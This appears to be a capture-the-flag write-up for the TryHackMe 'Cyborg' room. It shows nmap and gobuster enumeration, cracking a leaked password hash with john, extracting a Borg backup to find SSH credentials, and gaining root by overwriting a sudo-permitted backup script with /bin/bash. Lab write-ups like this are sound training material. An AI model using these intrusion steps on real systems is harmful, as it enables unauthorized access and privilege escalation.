**THM** : Cyborg<br>
**Room Link** : https://tryhackme.com/room/cyborgt8<br>
**Difficulty** : Easy <br>
**Flags to capture** : User and Root<br>
**Key Topics, Techniques, and Tools** : <br>
 - Ports and Services scan : [nmap](https://nmap.org/)
 - Web content discovery : [gobuster](https://github.com/OJ/gobuster)
 - Password cracking : [john](https://www.openwall.com/john/doc/)
 - Bash scripting 
 - [Borg Backup](https://borgbackup.readthedocs.io/en/stable/index.html)

<p align="center">   <img src="https://i.imgur.com/PcvVUaU.png"> </p>  

# Summary

- [Adding IP to the hosts file](#adding-ip-to-the-hosts-file)
- [Nmap scan](#nmap-scan)
- [Web content discovery](#web-content-discovery)
- [Password cracking](#password-cracking)
- [Extracting the archive](#extracting-the-archive)
- [User flag](#user-flag)
- [Privilege escalation](#privilege-escalation)

<p align="center">   <img src="https://i.imgur.com/Kmtrf12.png"> </p> 

## Adding IP to the hosts file 
I start by adding the IP of the machine to my hosts file:<br>
```
echo "10.10.208.76 cyborg.thm"|sudo tee -a /etc/hosts
```   

## Nmap scan

I perform an `Nmap` scan on the target host and save the output to a file called `nmapResults.txt` <br>
The scan includes all ports `-p-` and uses aggressive scan options `-A` <br>

```
└─# nmap cyborg.thm -A -p- -oN nmapResults.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 17:31 CEST
Nmap scan report for cyborg.thm (10.10.208.76)
Host is up (0.033s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dbb270f307ac32003f81b8d03a89f365 (RSA)
|   256 68e6852f69655be7c6312c8e4167d7ba (ECDSA)
|_  256 562c7992ca23c3914935fadd697ccaab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=4/19%OT=22%CT=1%CU=44609%PV=Y%DS=2%DC=T%G=Y%TM=6440099
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST1
OS:1NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   29.23 ms 10.8.0.1
2   29.38 ms cyborg.thm (10.10.208.76)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.41 seconds
```

There are 2 open ports :
- `SSH` - `OpenSSH 7.2p2` on port `22`
- `HTTP` - `Apache httpd 2.4.18` on port `80` 
<br>
After looking at the http service I found apache2 index page. 
<img src="https://i.imgur.com/D6tNb6X.png">

## Web Content Discovery
Let’s enumerate the Web Server further by running a `gobuster` scan.

```
└─# gobuster dir -u http://cyborg.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt             
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cyborg.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/04/26 17:40:46 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 308] [--> http://cyborg.thm/admin/]
/etc                  (Status: 301) [Size: 306] [--> http://cyborg.thm/etc/]
/server-status        (Status: 403) [Size: 275]
```

We have 2 directories that look interesting <br>

http://cyborg.thm/admin/ : 

<img src="https://i.imgur.com/wK7d1QR.png">

http://cyborg.thm/admin/admin.html There is a tab called `Admins` :

<img src="https://i.imgur.com/F3B898k.png">

There is a conversation from which we can distinguish an interesting information: there is a backup named `music_archive` This backup can be downloaded as `archive.tar` on the tab `Archive`

<img src="https://i.imgur.com/jfxjCmK.png">

Before examining the `archive.tar` file, I'll have a look at the second directory found by `gobuster` : http://cyborg.thm/etc/ : 

<img src="https://i.imgur.com/6giQRkO.png">

There is a directory `etc/squid` with 2 files 

The `passwd` file with a encrypted password :   
<img src="https://i.imgur.com/upl72bN.png">

The `squid.conf` file is the configuration file for `Squid`, an open-source proxy server that runs on Linux systems :
<img src="https://i.imgur.com/CS5B0MD.png">

## Password Cracking
I try to crack the hash found in the file `passwd` with `john` (using the wordlist `rockyou.txt`)

```
└─# echo '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.' > hash.txt
└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
squidward        (?)     
1g 0:00:00:00 DONE (2023-04-26 19:08) 5.263g/s 205136p/s 205136c/s 205136C/s 112806..samantha5
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

## Extracting the archive
The password obtained after cracking seems to be the password of the archive. So I take a look at the `archive.tar` file <br>
I start by untar the file archive to see if I can get useful information from its content
```
└─# tar -xvf archive.tar 
home/field/dev/final_archive/
home/field/dev/final_archive/hints.5
home/field/dev/final_archive/integrity.5
home/field/dev/final_archive/config
home/field/dev/final_archive/README
home/field/dev/final_archive/nonce
home/field/dev/final_archive/index.5
home/field/dev/final_archive/data/
home/field/dev/final_archive/data/0/
home/field/dev/final_archive/data/0/5
home/field/dev/final_archive/data/0/3
home/field/dev/final_archive/data/0/4
home/field/dev/final_archive/data/0/1
```

There is a README file in `home/field/dev/final_archive/` It seems interesting to consult it first :
```
└─# cat home/field/dev/final_archive/README
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```
It is indicated that the archive is a `Borg Backup` repository. The file contains a URL :
<img src="https://i.imgur.com/i19tMa9.png">

The URL refers to the borg backup documentation and explains how to extract the repository. <br>
First, `Borg` must be installed on the machine :
```
└─# apt install borgbackup 
```

I can extract the repository with the command `borg extract /path/to/repo::archive_name`
```
└─# borg extract final_archive::music_archive
Enter passphrase for key /home/bilnax/Téléchargements/CTF/cyborg/home/field/dev/final_archive: 
```
A passphrase is requested. It corresponds well to the one obtained from the cracking of the hash <br>
A `home/alex` directory is thus extracted, which seems to correspond to a home-dir backup for the `alex` user <br>

After going through the directory, I found the credentials of the user `alex` in the directory `home/alex/Documents` : 
```
└─# cat note.txt    
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```
The Nmap scan launched earlier, indicated that the ssh is activated on the server ([Nmap scan](#nmap-scan)). So, I try to access the server with SSH with these credentials. <br>

```
└─# ssh alex@cyborg.thm         
alex@cyborg.thm's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


27 packages can be updated.
0 updates are security updates.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

alex@ubuntu:~$ 
```
So I access the machine with SSH as user `alex`.

## User flag
Let's get the user.txt flag :
```
alex@ubuntu:~$ ls 
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
alex@ubuntu:~$ cat user.txt 
flag{*********************************}
```

## Privilege escalation
After having obtained a user access, I now try to get a root access in order to recover the root flag. <br>
I start by checking what the current user can run with sudo access :
```
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```
The command `sudo -l` indicates that the user `alex` can run `/etc/mp3backups/backup.sh` as root without entering a password :
```
alex@ubuntu:/etc/mp3backups$ ls -la
total 28
drwxr-xr-x   2 root root  4096 Dec 30  2020 .
drwxr-xr-x 133 root root 12288 Dec 31  2020 ..
-rw-r--r--   1 root root   339 Apr 26 11:21 backed_up_files.txt
-r-xr-xr--   1 alex alex  1083 Dec 30  2020 backup.sh
-rw-r--r--   1 root root    45 Apr 26 11:21 ubuntu-scheduled.tgz
```
The user `alex` is the owner of the file `backup.sh`. So I have the possibility to modify it. <br>
I modify the permissions of the file "backup.sh" by adding the write permission `+w` for the user who owns the file :
```
alex@ubuntu:/etc/mp3backups$ chmod +w backup.sh 
```

So, I can modify the `backup.sh` script and add a command to get a root shell :
```
alex@ubuntu:/etc/mp3backups$ echo '#!/bin/bash' > backup.sh
alex@ubuntu:/etc/mp3backups$ echo '/bin/bash' >> backup.sh
alex@ubuntu:/etc/mp3backups$ cat backup.sh 
#!/bin/bash
/bin/bash
alex@ubuntu:/etc/mp3backups$ sudo ./backup.sh 
root@ubuntu:/etc/mp3backups# 
```
I get a root shell. So I can get the root flag : 
```
root@ubuntu:/root# ls
root.txt
root@ubuntu:/root# cat root.txt 
flag{******************************}
```
